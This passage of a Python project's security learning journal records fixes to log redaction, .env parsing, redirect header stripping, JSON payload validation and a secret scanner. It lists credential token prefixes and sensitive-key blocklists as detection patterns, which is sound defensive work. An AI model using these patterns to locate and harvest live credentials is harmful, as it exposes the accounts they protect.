**Vulnerability:** Standard secret masking (e.g., `api_key`, `token`) failed to catch provider-specific naming conventions like Azure's `Ocp-Apim-Subscription-Key` or `x-api-key`, leading to potential leakage in error logs.
**Learning:** Generic blocklists often miss vendor-specific headers or query parameters which are standard in enterprise environments.
**Prevention:** Regularly update secret sanitization lists with vendor-specific patterns (AWS, Azure, GCP) and use broad regex matching (e.g., `.*subscription.*key`) where performance permits.

## 2026-03-05 - Strict TLD Blocking Breaks Reserved Domains
**Vulnerability:** Moving the `_UNSAFE_TLDS` check before DNS resolution caused tests using `.test` and `.example` to fail, as these were correctly flagged as unsafe/internal but were needed for unit testing.
**Learning:** Security controls that enforce "secure by default" (like strict TLD blocking) can conflict with standard testing practices that rely on reserved domains (RFC 2606).
**Prevention:** When hardening validation logic, verify that test fixtures use public/safe domains (e.g. `example.com`) or explicitly mock the validation step if testing unrelated logic.

## 2026-03-08 - Multiline Secrets in .env
**Vulnerability:** The line-based `.env` parser truncated multiline secrets (like private keys), corrupting them and potentially leading to configuration errors or fallback to insecure methods.
**Learning:** Simple line-splitting parsers (`splitlines()`) cannot handle quoted strings that contain newlines, which are common in cryptographic keys.
**Prevention:** Use a state-machine or character-by-character parser that respects quoting rules across line boundaries when parsing configuration files.

## 2026-03-09 - Sanitization Gaps from Key Variations
**Vulnerability:** Exact string matching for sensitive keys (e.g., `client_id`) allowed variations like `Client-ID` or `client-id` to bypass sanitization in error logs.
**Learning:** Developers often assume canonical forms for keys, but HTTP protocols and frameworks allow case-insensitivity and separator variations.
**Prevention:** Normalize keys (lowercase, remove separators) before checking them against blocklists to ensure consistent redaction regardless of input format.

## 2026-03-10 - Unenforced Timeouts in Helper Functions
**Vulnerability:** The `fetch_content_safe` helper allowed `timeout=None` (disabling total read timeouts) if the caller did not explicitly provide a timeout, bypassing the Slowloris protection.
**Learning:** Optional security parameters in helper functions often default to "insecure" (e.g. `None`) to preserve flexibility, but this shifts the burden of security configuration to every caller.
**Prevention:** Helper functions should enforce secure defaults (e.g., `timeout=DEFAULT_TIMEOUT`) internally if the caller omits the argument, rather than relying on the caller to provide them.

## 2026-10-27 - Secrets in URL Fragments
**Vulnerability:** The error sanitization logic (`_sanitize_url_for_error`) only redacted query parameters and basic auth, but ignored URL fragments (e.g. `#access_token=...`) which are commonly used in OIDC implicit flows.
**Learning:** URL fragments are often treated as "client-side only" but can persist in error logs if the URL object is logged in its entirety. Standard query parsing tools (`parse_qsl`) do not automatically handle fragments.
**Prevention:** Explicitly parse and sanitize URL fragments using query-parameter logic (`parse_qsl`) if they appear to contain key-value pairs, especially for keys like `token` or `key`.

## 2026-10-28 - Broken Secret Roundtrip in .env
**Vulnerability:** The custom `.env` parser ignored standard escape sequences (`\n`, `\r`, `\t`) in double-quoted strings, while the configuration wizard actively escaped them. This caused multiline secrets (like private keys) to be corrupted (flattened to literal `\n`) during the roundtrip.
**Learning:** When implementing custom parsers for standard formats (like `.env`), ensure strict symmetry between the writer (escaping) and the reader (unescaping). Partial implementation leads to data corruption.
**Prevention:** Explicitly support standard escape sequences in custom parsers or verify roundtrip integrity with property-based tests.

## 2026-03-12 - Sensitive Headers Leak on Port Change
**Vulnerability:** The `_safe_rebuild_auth` logic only checked for hostname changes and scheme downgrades, failing to strip sensitive headers when redirecting to a different port on the same host (e.g. `example.com:8443` -> `example.com:9443`).
**Learning:** Security boundaries often include ports, not just hostnames. Different ports can host different services with different trust levels.
**Prevention:** Include port comparison (normalizing default ports) when checking for origin changes in redirect handling logic.

## 2026-03-15 - Information Leakage in JSON Logs
**Vulnerability:** Log sanitization relied on regex patterns expecting whitespace (`\s`) but escaped newlines (`\n`) to literal `\\n` *before* matching. This caused multiline JSON logs (e.g., `{"password":\n"secret"}`) to bypass redaction because `\s` does not match `\`.
**Learning:** Order of operations matters in sanitization. Escaping control characters for log injection prevention must happen *after* sensitive data redaction, otherwise it corrupts the patterns used for detection.
**Prevention:** Always perform semantic analysis/redaction on the raw input first, then apply transport/storage safety encoding (like escaping) as the final step.

## 2026-03-20 - Secrets Leaked in Exception Tracebacks
**Vulnerability:** The logging formatter sanitized the main log message but appended the raw exception traceback, which could contain secrets in the exception message (e.g., `ValueError("Invalid token: secret_token")`).
**Learning:** Standard Python `logging` formatting separates the message from the traceback. Sanitizing only `record.msg` or `record.getMessage()` is insufficient if the exception info is also logged.
**Prevention:** Override `formatException` in custom formatters to explicitly sanitize the string representation of the traceback before appending it to the log entry.

## 2025-02-17 - [Log Sanitization: Whitespace Blindness]
**Vulnerability:** Log sanitization regexes for `key=value` assignments were too strict, failing to redact sensitive data when spaces were present around the operator (e.g., `password = secret`).
**Learning:** Developers often add spaces for readability in debug logs or configuration dumps. Standard query parameter parsers don't produce spaces, but free-text logging does.
**Prevention:** When writing regexes for log sanitization, always account for optional whitespace around separators (`\s*=\s*`) to cover human-formatted strings.

## 2026-03-21 - OAuth/SAML Token Leakage in Logs
**Vulnerability:** Log sanitization rules missed critical OAuth/SAML parameters (`client_assertion`, `SAMLRequest`, `nonce`, `state`), allowing them to be logged in plain text during authentication flows.
**Learning:** General-purpose secret scanners often focus on generic terms (like `password` or `token`) but miss protocol-specific sensitive fields.
**Prevention:** Explicitly include protocol-specific sensitive parameters (e.g., from OAuth 2.0, OIDC, SAML specs) in log redaction configurations.

## 2026-03-25 - Information Leakage in Short Secret Masking
**Vulnerability:** The secret masking logic revealed 4 characters at both the start and end of any secret longer than 8 characters, exposing nearly 50% of short secrets (e.g. 16-char API keys).
**Learning:** One-size-fits-all redaction rules (like "show first/last 4") leak disproportionately more information for shorter secrets.
**Prevention:** Implement tiered redaction logic that scales the visible portion based on the total length of the secret (e.g. only show 2 chars for secrets < 20 chars).

## 2026-10-29 - Dynamic Sensitive Header Stripping
**Vulnerability:** Static lists of sensitive headers in redirect handling failed to catch custom authentication headers (e.g. `X-Super-Secret-Token`), leading to potential leakage in cross-origin redirects.
**Learning:** Security allowlists/blocklists are brittle against custom naming conventions.
**Prevention:** Implement dynamic header inspection using partial keyword matching (e.g. "token", "secret", "auth") to automatically detect and strip sensitive headers during redirects, ensuring defense-in-depth.

## 2024-05-22 - Session ID and Cookie Leakage in Logs
**Vulnerability:** `session_id` and `cookie` query parameters and key-value pairs were not redacted in logs because they didn't match existing sensitive key patterns (specifically missing from `_SENSITIVE_QUERY_KEYS` and logging regex).
**Learning:** Regex-based redaction is fragile if keys are not explicitly listed or covered by broad patterns. Normalization helps but `session_id` vs `session` was a gap.
**Prevention:** Maintain a comprehensive list of sensitive keys and test with common variations (snake_case, camelCase). Use broad matching where possible but verify false positives.

## 2026-10-30 - Fallback Log Sanitization Gap
**Vulnerability:** The fallback log sanitization in `src/utils/env.py` (used during import errors) lacked patterns for OAuth/SAML secrets (`nonce`, `state`, `client_assertion`) that were present in the primary `src/utils/logging.py`, creating a window of exposure if dependencies failed.
**Learning:** Fallback or redundant security implementations often drift from the primary source of truth, creating inconsistent security postures.
**Prevention:** Automatically verify that fallback/redundant security logic matches the primary implementation (e.g., via unit tests that compare regex patterns or outputs).

## 2026-02-21 - [Secret Scanner Enhancement]
**Vulnerability:** Generic high-entropy detection lacked specificity for common high-value secrets like Google API Keys and Telegram Bot Tokens.
**Learning:** Specific regex patterns improve triage and remediation speed by identifying the exact type of secret exposed.
**Prevention:** Added specific regexes to `_KNOWN_TOKENS` in `src/utils/secret_scanner.py`.

## 2025-04-24 - Zero Trust Upstream Payload Validation
**Vulnerability:** Upstream provider API integrations (`src/providers/vor.py` and `src/providers/wl_fetch.py`) parsed JSON directly via `json.loads` without validating the returned data type. A compromised or misconfigured API returning unexpected JSON structures (like a list instead of a dict) could cause runtime crashes or inject malformed data into downstream parsing logic that assumes dictionary methods (like `.get()`).
**Learning:** Even "trusted" official external APIs must be treated as untrusted boundaries in a Zero Trust architecture. Just because data parses successfully as JSON doesn't mean it conforms to the expected shape or type for the application state.
**Prevention:** Always follow up `json.loads` with explicit type and schema validation (e.g., `if not isinstance(data, dict): return safe_fallback`) before passing the deserialized payload to application logic, ensuring the application fails securely and drops malformed data at the network boundary.

## 2026-04-29 - Security Theater: Cryptography vs. Determinism
**Vulnerability:** Using `secrets.SystemRandom` instead of `random.Random` when a predictable, seeded state is required.
**Learning:** Applying cryptographic security libraries where a predictable, seeded state is required constitutes "Security Theater" and actively breaks the intended application logic. It highlights the conceptual difference between true cryptographic randomness and functional determinism.
**Prevention:** Distinguish between true cryptographic needs and deterministic randomness, using inline comments (`# noqa: S311 # nosec B311`) to suppress security linter warnings where pseudo-randomness is intentionally required.

## 2026-05-05 - AI Provider Tokens Missed by Scanner
**Vulnerability:** `_KNOWN_TOKENS` in `secret_scanner.py` lacked patterns for Anthropic (`sk-ant-…`) and OpenAI (`sk-proj-…`, `sk-svcacct-…`, legacy `sk-<48 alnum>`) keys, even though this project itself runs on Claude. A leaked key would have been caught only by the generic high-entropy fallback (which is silenced by `is_covered` if any specific token already matches the same span) and would not be reported with a precise reason.
**Learning:** Secret scanners must include patterns for the AI/cloud services the project itself depends on — those credentials are exactly the ones most likely to end up in this codebase. The legacy OpenAI `sk-<48>` pattern is benign next to `sk-ant-` / `sk-proj-` because the latter contain a hyphen after `sk-`, which is excluded from `[A-Za-z0-9]{48}`.
**Prevention:** When introducing a new external API integration, also extend `_KNOWN_TOKENS` with the issuer's documented key prefix and length. Order strict patterns before looser ones so `is_covered` correctly attributes findings.

## 2026-05-05 - GitHub Non-PAT Tokens Missed by Scanner
**Vulnerability:** `_KNOWN_TOKENS` only matched `ghp_` (Personal Access Token) and `github_pat_` (fine-grained PAT). The four other GitHub token prefixes — `gho_` (OAuth App), `ghu_` (App user-to-server), `ghs_` (App server-to-server, identical to the `GITHUB_TOKEN` GitHub Actions auto-injects) and `ghr_` (refresh) — would only be caught by the generic high-entropy fallback, which suppresses precise attribution and is easier to silence with a per-line ignore.
**Learning:** Token-prefix lists drift behind GitHub's actual token taxonomy. The `ghs_` gap is especially dangerous because every Actions workflow run produces one of those tokens; a leak in a log artefact or committed snapshot grants repo-scoped write access for the workflow lifetime.
**Prevention:** When adding a token-prefix entry, scan the issuer's full prefix list (GitHub: `gh[opsur]_<36 alnum>`) and add all related variants in one pass. Keep each variant as its own pattern with a distinct reason so the finding identifies which token type leaked.

## 2026-05-05 - SendGrid Keys Defeat the Entropy Fallback
**Vulnerability:** SendGrid API keys have the structural format `SG.<22 chars>.<43 chars>`. The dots between segments are outside the high-entropy character class (`[A-Za-z0-9+/=_-]`), so the generic fallback regex cannot match the full token — it would only flag the trailing 43-character segment in unassigned contexts (e.g. `connect("SG.…")`), and it would do so as a generic "high-entropy" string with no SendGrid attribution. The `SG.` prefix and the 22-char identifier silently disappeared from the report.
**Learning:** Multi-segment tokens that use a non-alphanumeric separator (`.`, `:`, `|`) bypass character-class-based entropy detectors entirely. The fallback only sees one of the segments, which is shorter than the real secret and missing the issuer-identifying prefix — making triage and revocation significantly slower.
**Prevention:** When adding a token to `_KNOWN_TOKENS`, check whether its canonical format contains separators outside `[A-Za-z0-9+/=_-]` (especially `.` for JWT-shaped tokens, Discord bot tokens, SendGrid). If so, the entropy fallback cannot replace a specific pattern — add the full multi-segment regex so the whole token is captured and attributed.

## 2026-05-06 - Stripe `sk_test_` and Slack `xox[ar]-` Missed by Scanner
**Vulnerability:** `_KNOWN_TOKENS` in `secret_scanner.py` covered Stripe live keys (`sk_live_`) and Slack bot/user tokens (`xoxb-`, `xoxp-`) but stopped there. Stripe `sk_test_` keys, Slack OAuth-app access tokens (`xoxa-`) and Slack refresh tokens (`xoxr-`) were left to the generic high-entropy fallback — which suppresses precise attribution and is easier to silence per-line. The Slack refresh-token gap was the worst of the three: `xoxr-` mints fresh `xoxb-`/`xoxp-` until revoked, so a leaked refresh token is effectively a long-lived workspace credential.
**Learning:** This is the same drift pattern already recorded for GitHub (`gh[opsur]_`) and the AI-provider keys — if any one variant of an issuer's token taxonomy is in `_KNOWN_TOKENS`, the *missing* variants stand out in the diff and almost always belong there too. The mitigation isn't to add a new rule; it's to grep the existing `_KNOWN_TOKENS` list against each issuer's official prefix list whenever a new entry lands. Stripe's `sk_test_` was especially easy to miss because it's "less catastrophic" — but a leaked test key still grants test-dashboard access *and* signals that a live key probably exists nearby.
**Prevention:** Treat `_KNOWN_TOKENS` as an issuer-keyed table, not a list. Whenever a new issuer is added or an existing entry is edited, walk the issuer's full documented prefix taxonomy (Stripe: `sk_live_`, `sk_test_`, `rk_live_`, `rk_test_`, `whsec_`; Slack: `xoxb-`, `xoxp-`, `xoxa-`, `xoxr-`, `xoxe-`, `xoxs-`) and add every variant in the same pass with a distinct reason. Each variant gets its own test in `tests/test_secret_scanner_*` so future drift is caught by CI rather than during incident response.

## 2026-05-06 - Zero-Trust Gap in VOR Station-API Loop Affects Loop Continuity
**Vulnerability:** `scripts/update_vor_stations.py:fetch_vor_stops_from_api` parsed `response.json()` for each station ID and immediately called `payload.get("StopLocation")` without an `isinstance(payload, Mapping)` guard. Decode failures (`ValueError`) were already routed to the fallback path, but a successfully-decoded list / scalar / null body would raise `AttributeError` from `.get()`. Because the call happens **inside** a `for station_id in ids:` loop, the exception propagates *out of the loop entirely* — every subsequent station is silently skipped, and the same-batch fallbacks for those stations never run.
**Learning:** Per-iteration Zero-Trust failures are worse than per-call ones: a raised `AttributeError` in a flat loop terminates the whole batch, and the per-station fallback handler that exists *for exactly this scenario* is bypassed because it is unreachable after the raise. The fix is not just "add the isinstance check" but specifically "route shape failures through the same fallback branch as decode failures and HTTP errors", so that loop continuity matches the existing failure-handling contract.
**Prevention:** When a Zero-Trust shape guard is added inside a loop, mirror the structure of the nearest existing failure branch (`except ValueError:` here) verbatim — same log call, same fallback lookup, same `continue`. Test the new branch with parametrised non-object payloads (`[]`, `None`, `42`, `"a string"`) and assert the loop **continues** to subsequent iterations, not just that the current one is skipped.

## 2026-05-06 - Zero-Trust Validation Missed in Baustellen Fallback Loader
**Vulnerability:** `scripts/update_baustellen_cache.py:_load_fallback` returned `cast(dict[str, Any], json.loads(raw))` with no runtime `isinstance` guard. The remote-fetch path (`_load_json_from_content`) already enforced the shape, but the fallback path — used precisely when the network is unreachable — did not. A list / scalar / null body in the on-disk fallback (whether tampered or simply mis-edited) would propagate to `_iter_features`, where `payload.get("type")` would crash with `AttributeError`. The cache update then exits non-zero on the very failure path it exists to recover.
**Learning:** The `cast(...Dict, json.loads(...))` red flag is the same one already journaled for `src/places/client.py`, but the audit had not been re-run against `scripts/`. Fallback / offline paths are easy to forget because they're rarely exercised in normal CI runs — and they're exactly where Zero-Trust matters most, since the network guard (`_load_json_from_content`) doesn't cover them. Whenever a remote loader gets a shape check, its fallback twin needs the same one.
**Prevention:** When grepping for `cast(.*Dict.*json` (the explicit anti-pattern) or `json\.loads(` followed by a `cast`, treat fallback / on-disk variants of any HTTP-loader as in-scope — they share the same parsing call but bypass the network helper. Reuse the network helper's shape guard verbatim, or factor a shared `_require_json_object(raw)` helper so the two loaders cannot drift again.

## 2026-05-05 - Zero-Trust Validation Missed in Places Client
**Vulnerability:** The April-2025 "Zero Trust Upstream Payload Validation" fix added `isinstance(payload, dict)` checks in `src/providers/vor.py` and `src/providers/wl_fetch.py` after `json.loads`, but `src/places/client.py:_post` still returned `cast(Dict[str, object], payload)` with no runtime validation. `cast()` only lies to the type checker — at runtime, a list/null/scalar JSON body from the Google Places API would propagate to `_iter_tile`, where `response.get("places", [])` would crash with `AttributeError` (lists don't have `.get()`).
**Learning:** A repo-wide "Zero Trust" pass needs to enumerate **every** call site of `json.loads` *and* `response.json()`, not just provider-named files. The places client lives outside `src/providers/` so it was overlooked. A `cast(Dict, …)` adjacent to a `json()` call is a strong signal the validation was forgotten — `cast` performs no runtime check.
**Prevention:** When fixing a class of issues across the repo, grep for **both** `json\.loads` and `\.json()` (and any `cast(.*Dict` pattern adjacent to JSON parsing). Treat every external HTTP boundary identically, regardless of which directory it sits in.
